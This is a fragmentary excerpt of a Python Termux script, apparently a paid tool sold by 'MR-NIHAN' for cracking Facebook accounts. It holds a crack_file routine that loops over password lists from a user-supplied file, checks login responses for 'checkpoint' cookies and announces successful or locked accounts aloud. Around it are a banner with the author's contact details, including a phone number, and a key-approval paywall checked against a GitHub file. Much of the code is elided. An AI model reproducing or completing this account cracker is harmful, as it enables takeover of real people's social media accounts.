...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'NIHAN' and password == 'Rakhi':
...
os.system('espeak -a 300 " Welcome,   to,  NIHAN,  King,  Tools"')
os.system('xdg-open https://www.facebook.com/profile.php?id=100089790850149.Ok.Bro')
def banner():
	os.system("clear")
	print (f"""
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-NIHAN ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • NIHAN ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mNIHAN ]   ║\33[1;34m   
╠══[Whatsapp                 • 01981002555 ]  ║\33[1;35m 
╠══[TOOLS                    • Paid  ]        ║ \33[1;32m   
...
def crack_file():
	...
	print('\033[1;32m[ Put File Example:  /sdcard/NIHAN.txt  Etc...]')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#nihan
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•Nihan-Cp] {idf} • {pw}')     
				...
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " Nihan,  Ok,  id"')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/Termux-nihan/blob/main/Approval.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+NIHAN+key1)
		...
		time.sleep(3.5)
		tks = 'Assalamu%20Alaikum-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+NIHAN+''+key1
